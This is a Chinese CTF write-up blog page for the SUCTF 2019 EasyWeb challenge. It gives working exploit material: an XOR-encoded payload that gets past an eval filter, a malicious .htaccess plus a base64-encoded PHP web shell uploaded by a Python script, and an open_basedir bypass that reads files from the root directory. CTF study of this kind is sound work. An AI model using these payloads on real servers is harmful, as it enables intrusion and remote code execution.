@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>suctf2019-EasyWeb - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=writeup,文件上传,代码执行>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">suctf2019-EasyWeb</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  
+
+  <div class="post-content">
+    <p>suctf 2019的web2<br>buuoj上的环境:<a href="https://buuoj.cn/challenges#[SUCTF%202019]EasyWeb" target="_blank" rel="noopener">https://buuoj.cn/challenges#[SUCTF%202019]EasyWeb</a></p>
+<p>访问得到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这题分为两个部分，先是一个各种限制的代码执行,目的是调用get_the_flag()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第一个限制，长度不能超过18</span></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第二个限制，一个很变态的正则,字母数字都被禁了</span></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//第三个限制,使用的字节值数目不能超过12个</span></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br></pre></td></tr></table></figure>
+<p>不想看正则的话可以简单的fuzz一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($i))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> urlencode(chr($i)).<span class="string">' '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到可以使用的特殊字符:</p>
+<blockquote>
+<p>! # $ % ( ) * + - / : ; &lt; &gt; ? @ \ ] ^ { }</p>
+</blockquote>
+<p>p神有一篇文章<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a><br>里面讲了三种思路:</p>
+<ul>
+<li>异或</li>
+<li>取反</li>
+<li>自增</li>
+</ul>
+<p>其中取反符号~直接被禁掉了，自增需要用到变量长度会很长,因此尝试使用异或<br>因为有长度的限制，所以可以去凑出类似</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET&#123;x&#125;();</span><br></pre></td></tr></table></figure>
+<p>然后传入x=get_the_flag调用该函数</p>
+<p>用脚本去找出对应异或的值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">find = [<span class="string">'G'</span>,<span class="string">'E'</span>,<span class="string">'T'</span>,<span class="string">'_'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        result = chr(i^j)</span><br><span class="line">        <span class="keyword">if</span>(result <span class="keyword">in</span> find):</span><br><span class="line">            a = i.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            b = j.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            a = urllib.parse.quote(a)</span><br><span class="line">            b = urllib.parse.quote(b)</span><br><span class="line">            print(<span class="string">"%s:%s^%s"</span>%(result,a,b))</span><br></pre></td></tr></table></figure>
+<p>最后凑出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe&#x3D;get_the_flag</span><br></pre></td></tr></table></figure>
+<p>成功调用get_the_flag函数<br>再来看get_the_flag()的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到是一个文件上传，和web1 CheckIn(<a href="https://liotree.github.io/2019/08/19/CheckIn/)的限制一样">https://liotree.github.io/2019/08/19/CheckIn/)的限制一样</a></p>
+<ul>
+<li>文件内容中不能出现&lt;?</li>
+<li>使用了exif_imagetype来判断是不是图片</li>
+<li>后缀名中不允许出现ph </li>
+</ul>
+<p>不过环境和web1不一样</p>
+<ul>
+<li>web1是nginx的服务器，而且上传目录下有一个php文件，所以上窜.user.ini</li>
+<li>web2是apache的服务器，应该上传.htaccess</li>
+</ul>
+<p>还有两个要注意的点是:</p>
+<ul>
+<li>.htaccess上传的时候不能用GIF89a等文件头去绕过exif_imagetype,因为这样虽然能上传成功，但.htaccess文件无法生效。这时有两个办法:<ol>
+<li>在.htaccess前添加<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> width 1337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> height 1337</span></span><br></pre></td></tr></table></figure>
+#在.htaccess是注释符，所以.htaccess文件可以生效  </li>
+<li>在.htaccess前添加\x00\x00\x8a\x39\x8a\x39(要在十六进制编辑器中添加，或者使用python的bytes类型)<br>\x00\x00\x8a\x39\x8a\x39 是wbmp文件的文件头<br>.htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess</li>
+</ol>
+</li>
+<li>这里的php是7.2的版本，无法使用<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+来绕过对&lt;?的检测<br>解决方法是将一句话进行base64编码，然后在.htaccess中利用php伪协议进行解码,比如:<br>.htacess<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337 </span><br><span class="line">AddType application&#x2F;x-httpd-php .abc</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_fd40c7f4125a9b9ff1a4e75d293e3080&#x2F;shell.abc&quot;</span><br></pre></td></tr></table></figure>
+shell.abc<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a12</span><br><span class="line">PD9waHAgZXZhbCgkX0dFVFsnYyddKTs/Pg==</span><br></pre></td></tr></table></figure>
+这里GIF89a后面那个12是为了补足8个字节，满足base64编码的规则,使用其他的文件头也是可以的<br>贴一个上传的脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b"""</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .abc</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.abc"</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">shell = <span class="string">b"GIF89a12"</span> + base64.b64encode(<span class="string">b"&lt;?php eval($_REQUEST['a']);?&gt;"</span>)</span><br><span class="line">url = <span class="string">"http://16855023-61d5-430f-bbef-53d0bca8f179.node1.buuoj.cn?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag"</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'file'</span>:(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'file'</span>:(<span class="string">'shell.abc'</span>,shell,<span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
+访问?a=phpinfo(); 得到phpinfo<br>这时会发现存在open_basedir和disable_functions的限制<br>open_basedir:<blockquote>
+<p>/var/www/html/:/tmp/</p>
+</blockquote>
+</li>
+</ul>
+<p>可以利用一个新的方法绕过open_basedir的限制<br><a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720</a></p>
+<p>最后访问</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=chdir(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);print_r(scandir(<span class="string">'/'</span>));</span><br></pre></td></tr></table></figure>
+<p>找到flag文件THis_Is_tHe_F14g<br>访问</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=chdir(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);print_r(file_get_contents(<span class="string">'/THis_Is_tHe_F14g'</span>));</span><br></pre></td></tr></table></figure>
+<p>拿到flag</p>
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2019-08-21</span>
+  </div>
+
+  <div class="post-footer">
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" rel="tag">代码执行</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2025
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
